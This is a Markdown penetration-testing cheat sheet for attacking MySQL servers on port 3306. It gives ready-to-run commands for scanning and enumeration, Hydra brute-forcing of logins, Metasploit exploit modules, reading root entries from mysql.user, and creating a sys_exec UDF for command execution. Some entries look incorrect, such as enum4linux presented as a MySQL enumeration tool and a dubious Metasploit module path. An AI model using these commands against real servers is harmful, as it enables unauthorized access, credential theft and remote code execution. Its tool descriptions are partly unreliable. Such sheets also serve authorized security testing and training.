# MySQL

## Enumeration

### Metasploit

##### mysql_version
```bash
use auxiliary/scanner/mysql/mysql_version
set RHOSTS [IP]
set RPORT 3306
run
```

##### mysql_enum
```bash
use auxiliary/scanner/mysql/mysql_enum
set RHOSTS [IP]
set RPORT 3306
run
```

### Nmap

##### nmap (Service Version Detection)
```bash
nmap -A -n -p 3306 [IP]
```

##### nmap (Aggressive Scan with All Scripts)
```bash
nmap -A -n -PN --script=ALL -p 3306 [IP]
```

##### nmap (MySQL Specific NSE Scripts)
```bash
nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse [IP] -p 3306
```

### MySQL Client

##### mysql (Login to MySQL)
```bash
mysql -u [username] -p -h [IP] -P 3306
```

### Hydra

##### hydra (Brute Force MySQL Login)
```bash
hydra -l [username] -P [wordlist] mysql://[IP]:3306
```

### Enum4linux

##### enum4linux (MySQL Enumeration)
```bash
enum4linux -M -t [IP]
```


---
---


## Exploitation

### Metasploit

##### mysql_udf_payload
```bash
use exploit/linux/mysql/mysql_udf_payload
set RHOSTS [IP]
set RPORT 3306
run
```

##### mysql_sqli
```bash
use exploit/multi/http/mysql_sqli
set RHOSTS [IP]
set RPORT 3306
set TARGETURI /[path]
run
```

### Nmap

##### nmap (MySQL Vulnerability Scan)
```bash
nmap --script=mysql-vuln-cve2012-2122.nse [IP] -p 3306
```

### MySQL Client

##### mysql (Inject Malicious Query)
```bash
mysql -u [username] -p -h [IP] -P 3306 -e "SELECT * FROM mysql.user WHERE User='root';"
```

##### mysql (Exploit MySQL UDF)
```bash
mysql -u root -p -h [IP] -P 3306 -e "CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'libmysqludf_sys.so';"
```